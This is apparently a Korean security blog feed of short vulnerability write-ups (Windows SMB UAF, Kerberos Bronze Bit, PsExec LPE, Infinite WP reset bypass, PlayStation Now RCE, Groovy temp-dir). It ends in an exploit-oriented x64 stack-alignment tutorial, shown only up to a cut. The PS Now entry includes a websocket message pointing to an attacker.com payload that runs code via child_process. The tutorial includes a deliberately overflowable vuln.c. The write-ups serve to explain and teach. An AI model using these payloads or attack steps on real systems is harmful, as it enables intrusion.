    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys 드라이버</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)에서 CVE-2020-17140가 패치되어 Write-up이 공개되었습니다. CVE-2020-17140은 <code>SMB2_SET_INFO</code> 패킷의 처리 로직에서 발생하는 use after free로 커널 메모리를 노출시키는 취약점입니다.</p><p>SMBv2 이후부터 LEASE라는 새로운 caching mechanism이 도입되었고 클라이언트는 <code>SMB2_CREATE_REQEUST_LEASE_V2</code> 패킷을 보내 공유 파일에 lease를 생성하고, <code>SMB2_SET_INFO</code> 패킷을 보내 공유 파일의 lease를 수정할 수 있습니다.</p><p>srv2.sys 드라이버는 SMB2_SET_INFO 패킷을 받으면 <code>srv2!Smb2UpdateLeaseFileName</code>를 호출해서 lease 이름을 수정하는데, new lease name이 기존의 old lease name보다 길 경우 새로운 메모리(newFileBuf)를 할당해 old lease name을 백업합니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease name을 담고 있던 oldFileBuf를 할당 해제한 후에 newFileBuf에 복사하기 때문에 use after free가 발생합니다. oldFileBuf를 해제한 후 댕글링 포인터의 상태에 따라 kernel info leak 또는 BSoD로 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>kernel</tag>
      
      <tag>use after free</tag>
      
      <tag>smb</tag>
      
      <tag>info leak</tag>
      
      <tag>bsod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
    <link href="/2020/12/11/l0ch/2020-12-11/"/>
    <url>/2020/12/11/l0ch/2020-12-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Kerberos는 Windows Active Directory 도메인 내에서 사용자, 서버 및 기타 리소스를 서로 인증하는 데 사용되는 프로토콜입니다.<br>Kerberos의 기존 공격 방법인 Golden Ticket 및 Silver Ticket 공격의 변형인 Bronze Bit 공격이 공개되었습니다.</p><blockquote><p>Golden/Silver Ticket 공격<br>내부 네트워크에 침입한 이후 동일한 네트워크의 Kerberos 인증시스템을 사용하는 다른 시스템의 자격 증명을 위조하는 공격기법</p></blockquote><br><p>Bronze Bit는 Microsoft가 Kerberos 프로토콜에 추가 한 <code>S4U2self</code> 및 <code>S4U2proxy</code> 프로토콜을 악용하며 Kerberos 프로세스가 변조된 서비스 티켓을 감지할 수 없어 발생합니다. 공격을 위해서는 다음 조건이 만족되어야 합니다.</p><ol><li>해커는 내부 네트워크의 시스템 하나(Service1)를 장악해 Active Directory 내에 접근 권한이 있어야 합니다.</li><li>침입한 시스템인 Service1에 대한 암호 해시가 필요합니다.</li><li>Service1에는 다른 시스템(Service2)에 대한 제한된 신뢰 관계가 있습니다.</li></ol><p>위 조건이 만족되면 해커는 다음과 같은 공격이 가능합니다.</p><ol><li>사용자를 식별하고 티켓을 반환하는 <code>S4U2self</code> 에서 User2의 Service1 서비스 티켓을 가져옵니다. 이때 <code>force-forwardable</code> 옵션을 사용하면 반환하는 서비스 티켓이 전달 가능한 티켓으로 변환됩니다.</li><li>Service1의 해시로 티켓을 복호화하고 플래그 값의 두 번째 비트를 0→1 로 변경한 뒤 다시 암호화합니다. </li><li>조작된 티켓은 <code>S4U2proxy</code> 에서 전송되고 Service2에 대한 서비스 티켓이 User2로 반환되어 <code>User2.ccache</code>의 디스크에 기록됩니다.</li><li>해커는 Service1 유저(User1) 권한으로 Service2 유저(User2)의 Kerberos 서비스 티켓을 얻을 수 있어 User2 권한으로 Service2에 액세스가 가능합니다.</li></ol><p>이는 Golden/Silver Ticket과 유사한 공격 방법이지만 단일 비트 플립을 이용했기 때문에 Bronze Bit로 명명되었습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>kerberos</tag>
      
      <tag>bronze bit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PsExec Local Privilege Escalation</title>
    <link href="/2020/12/10/idioth/2020-12-10/"/>
    <url>/2020/12/10/idioth/2020-12-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>SysInternals Suite에서 원격으로 애플리케이션을 실행할 수 있는 PsExec에서 Local Privilege Escalation 취약점이 발견됐습니다. 해당 취약점은 글을 작성한 시점의 버전인 PsExec v2.2까지 영향을 미치며 아직 패치되지 않았습니다.</p><p>PsExec 클라이언트와 원격 PSEXESVC 서비스는 named pipe를 통해 통신합니다. 그 중 <code>\\PSEXESVC</code> 파이프는 실행할 응용 프로그램, 명령줄 데이터 등 PsExec 클라이언트의 명령을 분석하여 실행하는 역할을 합니다. <code>\\PSEXESVC</code> 파이프는 Administrator만 read/write 권한을 가져 권한이 낮은 사용자가 파이프에 read\write 하는 것을 막습니다.</p><p>하지만 PSEXESVC가 <code>\\PSEXESVC</code> 파이프를 생성할 때 파이프가 이미 존재할 경우 해당 <code>\\PSEXESVC</code> 파이프의 handle을 가져옵니다. 따라서 낮은 권한의 애플리케이션이 PSEXESVC가 실행되기 전에 <code>\\PSEXESVC</code> 파이프를 생성하면 PSEXESVC는 자신이 생성한 파이프가 아닌 이미 존재하는 파이프의 handle을 가져옵니다. PSEXESVC가 낮은 권한으로 생성된 <code>\\PSEXESVC</code> 파이프의 handle을 가져오면 PSEXESVC을 통해 SYSTEM 권한으로 명령, 응용 프로그램 실행이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
      <tag>idioth</tag>
      
      <tag>psexec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-28642: Auth bypass via password reset mechanism</title>
    <link href="/2020/12/09/fabu1ous/2020-12-09/"/>
    <url>/2020/12/09/fabu1ous/2020-12-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/">Auth bypass and RCE in Infinite WP admin panel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Infinite WP &lt;= 2.15.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress 웹사이트의 관리 솔루션 Infinite WP에서 비밀번호 재설정 방식의 결함을 이용해 admin panel에 접근할 수 있는 인증 우회 취약점이 발견되었습니다.</p><pre><code class="hljs php">$hashValue = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;hashCode&#x27;</span> =&gt; <span class="hljs-string">&#x27;resetPassword&#x27;</span>, <span class="hljs-string">&#x27;uniqueTime&#x27;</span> =&gt; microtime(<span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;userPin&#x27;</span> =&gt; $userDets[<span class="hljs-string">&#x27;userID&#x27;</span>]));$resetHash = sha1($hashValue);[...]$verificationURL = APP_URL.<span class="hljs-string">&quot;login.php?view=resetPasswordChange&amp;resetHash=&quot;</span>.$resetHash.<span class="hljs-string">&quot;&amp;transID=&quot;</span>.sha1($params[<span class="hljs-string">&quot;email&quot;</span>]);</code></pre><p>비밀번호 재설정 링크를 생성하는 php코드입니다.  피해자의 <code>email</code>을 사전에 입수하고 <code>userID</code>,  <code>microtime(true)</code> 값을 유추할 수 있다면 누구나 유효한 링크를 타고 원하는 유저의 비밀번호를 재설정할 수 있습니다.</p><ul><li>userID<ul><li>auto-increment integer입니다. manage-user라는 유료 addon을 구매하지 않았다면 기본값이 1입니다.</li></ul></li><li>email<ul><li>가입되지 않은 email 주소라면 <code>login.php?view=resetPassword&amp;errorMsg=resetPasswordEmailNotFound</code>로 redirect 됩니다. 이를 이용해 Infinite WP에 가입된 email인지 판별할 수 있습니다.</li></ul></li><li>microtime(true)<ul><li>microtime(true)의 값은 비밀번호 재설정 링크가 만들어질 때의 Unix timestamp입니다. Http date 해더 값을 이용해 유추가 가능합니다.</li></ul></li></ul><p>생성된 링크는 24시간 동안 유효합니다. 공개된 POC는 위에서 설명한 세 값을 이용해 브루트포싱 공격을 시도하며 평균 1시간 내외로 유효한 링크를 찾아냅니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Remote Code Execution in PlayStation Now</title>
    <link href="/2020/12/08/l0ch/2020-12-08/"/>
    <url>/2020/12/08/l0ch/2020-12-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now ≤ 11.0.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>게임 스트리밍 서비스 PlayStation Now에서 원격 코드 실행 취약점이 발견되었습니다.<br><br><br>PS Now의 주요 구성요소로는 QAS와 AGL이 있습니다. QAS는 Qt5 프레임워크로 개발된  <code>psnowlauncher.exe</code> 실행파일이며 PS Now의 메인 애플리케이션입니다.  AGL은 Electron 응용 프로그램이며 QAS에 의해 실행됩니다. 처음 로드할 페이지의 URL을 매개변수로 받아 실행이 가능합니다.<br><br><br><code>nodeIntegration</code>은 <code>Electron BrowserWindows</code>에서 실행되는 기능으로 javascript에서 Windows 프로세스를 생성할 수 있습니다. 기본값은 false지만 AGL에서는 true로 설정되어 있으며, AGL은 로드하는 URL 검증을 하지 않아 해커의 페이로드가 담긴 URL을 통해 javascript에서 임의 코드를 실행할 수 있습니다.<br><br><br>이 임의 코드 실행 취약점은 QAS에서 실행되는 로컬 웹 소켓 서버를 통해 원격으로 수행할 수 있습니다. 웹사이트가 다음 request를 로컬 웹 소켓 서버에 보내면 AGL에 로드된 URL을 QAS에서 실행합니다.  </p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,  <span class="hljs-attr">&quot;params&quot;</span>: &#123;    <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>  &#125;,  <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,  <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>&#125;</code></pre><p>그러나 source와 target을 바꿔 URL을 AGL에서 로드할 수 있도록 구성하면 원격에서 AGL이 로드할 URL을 조작할 수 있습니다.<br><br><br>피해자의 컴퓨터에서 PS Now와 QAS, 로컬 웹 소켓이 실행 중일 경우 아래와 같은 방법으로 원격 코드 실행이 가능합니다.</p><ol><li><p>브라우저로 해커의 웹사이트에 접속합니다.</p></li><li><p>웹 사이트는 피해자 PC의 웹 소켓 서버 <code>ws://localhost:1235</code> 에 연결됩니다.</p></li><li><p>웹사이트는 웹 소켓 서버에 다음과 같은 메시지를 보냅니다. </p> <pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,<span class="hljs-attr">&quot;params&quot;</span>:&#123;<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>&#125;,<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>&#125;</code></pre></li><li><p>AGL은 <code>https://attacker.com/rce_payload.html</code> 를 로드합니다. 이때 <code>rce_payload.html</code>의 javascript 코드가 피해자의 PC에서 실행됩니다.</p> <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PS Now RCE&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)            .exec(<span class="hljs-string">&#x27;calc&#x27;</span>)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>playstation</tag>
      
      <tag>remote code execution</tag>
      
      <tag>playstation now</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17521: Apache Groovy Information Disclosure</title>
    <link href="/2020/12/07/idioth/2020-12-07/"/>
    <url>/2020/12/07/idioth/2020-12-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2020/q4/183">https://seclists.org/oss-sec/2020/q4/183</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Unsupported Codehaus version of Groovy from 2.0 to 2.4.4.</li><li>Apache Groovy versions 2.4.4 to 2.4.20 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1.</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Groovy에서 <code>createTempDir</code> method로 인한 Local Privilege Escalation과 Information Disclosure가 가능한 취약점이 발견되었습니다. 이 취약점은 유닉스 기반 운영 체제와 Mac OSX, Windows의 옛날 버전이 영향을 받습니다. 취약점에 노출되는 조건은 아래와 같습니다.</p><ul><li>영향을 받는 운영 체제에서 Groovy code가 동작</li><li>다른 유저가 Groovy code에 접근할 수 있음</li><li><code>createTempDir</code> extension method를 통해 임시 디렉터리가 생성</li></ul><p>Groovy는 모든 유저가 공유할 수 있는 OS 임시 디렉터리 내에 임시 디렉터리를 만들 수 있습니다. Groovy에서 <code>createTempDir</code> method를 사용하면 java stub을 생성할 때 사용되거나 user code를 대신하기 위한 임시 디렉터리가 생성됩니다. Groovy user code가 <code>createTempDir</code> method를 사용하여 임시 디렉터리에 실행할 수 있는 코드를 저장하면 Local Privilege Escalation이 가능하고 민감한 정보를 저장하기 위해 임시 디렉터리가 사용된다면 정보가 노출되거나 수정될 수 있습니다.</p><p>취약점이 수정된 Groovy 2.5 이상 버전과 JDK 7 이상에서 실행되는 Groovy 2.4에서는 Groovy Code를 실행하는 사용자만 읽을 수 있는 디렉터리를 생성하는 새로운 JDK method를 사용합니다. 하지만 이 방법은 Local Privilege Escalation은 막을 수 있지만 Information Disclosure는 막을 수 없습니다.</p><p>시스템 환경 변수 <code>java.io.tmpdir</code>를 실행 중인 사용자의 고유 디렉터리로 설정하면 모든 운영 체제와 Groovy 버전에서 취약점이 해결됩니다. 혹은 Groovy extension method 대신 JDK의 <code>Files#createTempDirectory</code> method를 사용하여 취약점을 방지할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>information disclosure</tag>
      
      <tag>idioth</tag>
      
      <tag>apache</tag>
      
      <tag>groovy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] x64 stack alignment</title>
    <link href="/2020/12/06/fabu1ous/x64-stack-alignment/"/>
    <url>/2020/12/06/fabu1ous/x64-stack-alignment/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>비밀 프로젝트( 아직 비밀, 쉿! ) 때문에 Ubuntu 20.04에서 몇 가지 테스트를 하다가 처음 보는 에러에 당황했습니다. <code>do_system+364: movaps</code> 인스트럭션에서 Segmentation Fault가 발생하더라고요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>알아보니까 Ubuntu 18.04부터 <code>do_system()</code>에 <code>movaps</code>인스트럭션이 하나 추가됐습니다. 조금 뒤에 자세히 설명하겠지만, x64 리눅스에선 16바이트로 stack alignment를 지켜야 합니다. stack alignment가 깨져있으면 이 인스트럭션을 실행하다 Segmentation Fault가 뜹니다.</p><p>이놈 때문에 18.04 이전 버전에서 익스 되는 BOF 공격코드가 18.04 이후 버전에서는 사용할 수 없는 경우도 있다고 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>故 Fabu1ous의 네이버 블로그 (2018.10 ~ 2019.12)</em></p><p>지금까지 푼 포너블 문제만 백몇 개쯤 되고 수없이 많은 <code>system(&quot;/bin/sh&quot;)</code>을 호출해 봤는데 어째서 이 사실을 이제야 알게 된 거지?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>작년(2019) 크리스마스 CTF에서 단순 ROP문제를 익스 못해서 화났던 기억이 머리를 스치고 지나갔습니다. 분명 로컬에선 익스가 되던 게 리모트 익스가 안돼서 팀원에게 코드를 넘겨주고 다른 문제 보러 갔었죠. 그때 못 풀었던 ROP문제는 solo_test란 문제였는데 그때 로컬 환경이 우분투 16.04였습니다… 후…</p><p>대회 끝나고 바로 며칠 뒤에 이 주제에 대한 라업이 하나 올라왔는데 1년이 지난 지금에서야 찾아본 제 자신이 너무 밉네요. ROP문제라고 대수롭지 않게 그냥 넘겨버린 것에 반성하며 지금이라도 공부해봅시다.</p><blockquote><p>늦었다고 생각할 때가 진짜 너무 늦었다 -박명수-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment는 stack의 top이 16의 배수로 유지된 상태며 메모리의 access cycle을 최소한으로 줄이기 위해 사용합니다. ( CS를 공부하다가 “왜?”라는 질문을 던지면 십중팔구 “효율”이라는 대답이 돌아옴, 더 자세한 건 직접 찾아보시길 ) 그리고 이 stack alignment를 유지하기 위해 RSP의 위치가 정해지는 규칙이 있습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>방금 전엔 RSP를 16의 배수로 유지하는 게 stack alignment라 해놓고 갑자기 RSP+8이 16의 배수라니, 뭐라는 거야?</p><p>무슨 소린지 모르겠죠? 설명이 뭐 같이 쓰여있어서 그렇지 사실 아주 간단합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>간단한 예제를 통해 확인해봅시다. 디버깅할 때 거슬리니 PIE는 해제하고 컴파일하세요. 저는 Ubuntu 20.04와 glibc-2.31를 사용했습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>정상적으로 호출된 <code>main()</code> 함수의 entry point입니다. 아직 프롤로그를 실행하기 전이니 RSP+8은 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>위 스크린샷을 보면 RSP+8은 <code>0x7fffffffe040</code>이므로 16의 배수가 맞습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>그럼 다들 알다시피 call 인스트럭션으로 함수를 호출하면 stack에 return address를 push 하니까 call 인스트럭션을 실행하기 직전엔 RSP가 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>그리고 함수 프롤로그에서 <code>push rbp</code>를 하니까 rbp는 항상 16의 배수겠네요?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>대충 정리해보면 stack align을 지키면서 함수를 호출하는 흐름은 다음과 같습니다.</p><ol><li>call 실행 직전 RSP는 16의 배수 ( stack align O )</li><li>함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )</li><li>함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )</li><li>RBP는 항상 16의 배수 ( stack align O )</li></ol><p>사실, 함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰집니다. 여기서 2번만 똑 떼서 “이 것만 지키시면 stack align입니다.”라고 설명을 써놔서 헷갈리는 겁니다. 이래도 이해 안 되시면 4번만 기억하세요. 4번만 신경 써줘도 공격 코드를 짜는데 아무 지장이 없을 겁니다. 더 자세한 설명은 조금 이따 하겠습니다.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>이 규칙을 꼭 지켜야 하는가? 물론 아닙니다. 방금 전에도 설명했듯이 유연하게 어겼다가 지켰다가 할 수 있습니다. 그리고 stack alignment는 효율을 높이기 위해 유지한다고도 설명했다시피 지키지 않아도 프로그램이 동작하는데 아무 문제없습니다. 다만 효율이 좀 떨어질 뿐… 물론 예외가 존재하는데 몇몇 intel/AMD cpu에서 SSE instruction을 실행할 때  stack alignment가 깨져있으면 segmentation fault가 발생합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>그리고 <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>가 바로 SSE intruction 중 하나입니다. XMM 레지스터끼리 혹은 XMM 레지스터와 메모리 사이에서 double quadword( 16byte ) 크기의 데이터를 옮기는 인스트럭션인데, 메모리의 align 여부를 강제합니다.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM 레지스터와 메모리 사이에서 데이터를 옮길 때, 메모리의 align이 깨져있으면 general protection( #GP / SIGSEGV ) fault를 발생시킵니다. 그리고 Ubuntu 18.04부터 이 movaps 인스트럭션이 <code>do_system()</code>을 포함한 여러 멀티미디어 오퍼레이션에 추가되어 exploit을 작성할 때 stack alignment를 신경 써야 합니다.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>그래서 Exploit이랑 stack align이 깨지는 거랑 무슨 상관인데? 그래서 왜 16.04에선 쉘을 띄우던 공격 코드가 18.04부턴 작동 안 하는 건데? 이거를 이해하려면 우선 control intsruction들의 차이를 알아야 합니다. 생각보다 모르는 사람이 많더라고… 각 인스트럭션마다 스택의 변화, 더 자세히 말하자면 RSP의 변화가 어떤지 알아야 합니다.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>단순히 프로그램의 흐름을 옮김. 인용구를 보면 알겠지만 리턴 정보를 저장하지 않습니다. jmp 인스트럭션으로 인한 스택의 변화는 없다고 생각하시면 됩니다.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>반면 call 인스트럭션은 프로그램의 흐름을 옮기는 것이 아니라 subroutine에 잠시 들렀다가 돌아오는 것이기 때문에 리턴 정보를 저장합니다. 그리고 그 리턴 정보는 stack에 push 하기 때문에 call 인스트럭션을 실행한 뒤엔 RSP의 값이 8만큼 감소합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello 인스트럭션이 실행되면 &lt;main+18&gt;을 stack에 push 하겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>따라서 정상적으로 호출된 함수의 entry point에선 RSP+8이 16의 배수가 되는 겁니다. 여기서 꼭 기억하셔야 할 것이 Call을 실행한 직후엔 일시적으로 stack align이 깨진다는 겁니다.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call을 설명할 때 sub routine에 잠시 들렀다 돌아간다고 했습니다. 물론 이 모든 동작을 call이 다 하진 않고, 원래의 인스트럭션 스트림으로 다시 돌아가는 동작은  ret이 대신해줍니다.</p><p>ret은 두 인스트럭션을 하나로 합쳐 놨다고 생각하시면 되는데, call이 저장해놓은 리턴 정보를 스택에서 빼내어 jmp 합니다. 즉, RSP값이 8만큼 증가한다는 뜻입니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>위 스크린샷은 ret을 실행하기 직전의 상황입니다. RSP 값을 보면 아시겠지만 ret을 실행하기 직전엔 stack align이 깨져있습니다. 이는 함수 에필로그의 leave 명령어 혹은 pop rbp의 결과겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>그리고 ret을 실행하면 RSP가 8만큼 증가하고 stack align이 다시 맞춰집니다.</p><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><ul><li>call : RSP-=8 → 일시적으로 stack align을 깸</li><li>ret : RSP+=8 → leave 명령어로 깨진 stack align을 다시 맞춤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>자 이쯤 되면 대충 눈치채셨을 거 같은데, BOF공격을 할 때 ret으로 함수를 호출하죠? shellcode를 실행하는 건 논외로 치고, ret2libc( RTL )나 ROP로 BOF exploit을 하게 될 텐데 call이 아니라 ret으로 함수를 호출하기 때문에 stack alignment가 깨지게 되는 겁니다.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>정말 